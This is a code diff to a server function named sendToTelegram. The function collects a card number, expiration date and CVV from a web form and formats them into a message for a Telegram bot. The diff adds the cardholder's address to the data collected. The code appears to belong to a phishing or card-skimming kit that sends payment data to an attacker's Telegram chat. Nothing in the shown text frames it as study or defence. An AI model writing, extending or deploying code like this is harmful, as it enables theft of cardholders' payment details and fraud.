@@ -5,6 +5,7 @@ export async function sendToTelegram(prevState: any, formData: FormData) {
  const cardNumber = formData.get('cardNumber') as string;
  const expirationDate = formData.get('expirationDate') as string;
  const cvv = formData.get('cvv') as string;
+ const address = formData.get('address') as string;
 
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -19,6 +20,7 @@ export async function sendToTelegram(prevState: any, formData: FormData) {
 💳 *Card Number:* ${cardNumber}
 📅 *Expiration Date:* ${expirationDate}
 🔢 *CVV:* ${cvv}
+🏠 *Address:* ${address}
 
 🕒 ${new Date().toLocaleString()}`;
 
